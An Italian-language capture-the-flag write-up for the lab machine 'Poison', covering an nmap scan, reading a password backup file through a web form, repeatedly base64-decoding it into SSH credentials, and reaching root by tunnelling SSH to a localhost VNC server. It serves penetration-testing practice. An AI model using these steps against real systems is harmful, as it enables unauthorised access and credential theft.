# Poison

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap per conoscere le porte aperte e i servizi che girano su di esse.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.84
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.84
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/12%OT=22%CT=1%CU=41530%PV=Y%DS=2%DC=I%G=Y%TM=6527A9
OS:F2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=Z%II=RI%TS=21)
OS:OPS(O1=M54DNW6ST11%O2=M54DNW6ST11%O3=M280NW6NNT11%O4=M54DNW6ST11%O5=M218
OS:NW6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
OS:ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%
OS:RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

## Enumeration

Innanzitutto, visito la pagina http://10.10.10.84/:

<p align="center">
  <img src="/Immagini/Linux-Box/Poison/poison-1.png" />
</p>

Provo quindi ad inserire gli script elencati e uno di questi (_listfiles.php_) produce un output interessante:

```text
Array (
  [0] => .
  [1] => ..
  [2] => browse.php
  [3] => index.php
  [4] => info.php
  [5] => ini.php
  [6] => listfiles.php
  [7] => phpinfo.php
  [8] => pwdbackup.txt
  )
```

Provo ad insererire nel form "pwdbackup.txt" e ottengo il seguente output:

```text
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=
```

## Exploitation

Come suggerisce il testo nella parte iniziale del file provo ad effettuare la decodifica 13 volte, ricavando il seguente testo:

```text
Charix!2#4%6&8(0
```

Banalmente, provo ad accedere tramite ssh utilizzando le seguenti credenziali:
  * Utente: **charix**
  * Password: **Charix!2#4%6&8(0**

**Riesco ad entrare e ad ottenere il primo flag!**

<p align="center">
  <img src="/Immagini/Linux-Box/Poison/poison-2.png" />
</p>

## Privilege Escalation

Provo ad eseguire il comando _unzip_ sul file _secret.zip_ e scopro che è protetto dalla stessa password utilizzata precedentemente. Ottengo però un file che, almeno per il momento, non risulta essere interessante.

Provo quindi a cercare una via per diventare root.

Ispezionando i processi in esecuzione mi accorgo di che è attivo VNC sulla porta 5901 in localhost:

```text
USER    PID %CPU %MEM  VSZ  RSS   TT  STAT STARTED  TIME      COMMAND
root    529 0.0  0.9 23620  8932  v0- I    10:08    0:00.04   Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

VNC è un software che consente di visualizzare e controllare l'interfaccia utente grafica di un computer remoto. Per questo motivo c'è bisogno di una connessione specifica abilitando il port forwarding.

Per fare ciò, il seguente comando:

```text
ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84
```

Quindi, tutte le connessioni in arrivo sulla porta 5000 della mia macchina saranno instradate sulla porta 5901 in localhost sulla macchina _poison_.

Provo a connettermi utilizzando il seguente comando:

```text
vncviewer 127.0.0.1:5000
```

Ma richiede una password.

Dopo una breve ricerca capisco finalmente a cosa serve il file _secret_ ricavato precedentemente:

```text
vncviewer 127.0.0.1:5000 -passwd secret
```

<p align="center">
  <img src="/Immagini/Linux-Box/Poison/poison-3.png" />
</p>


## Credits

Vorrei ringraziare [Rana Khalil](https://twitter.com/rana__khalil) per la sua [guida](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/poison-writeup-w-o-metasploit#0811).
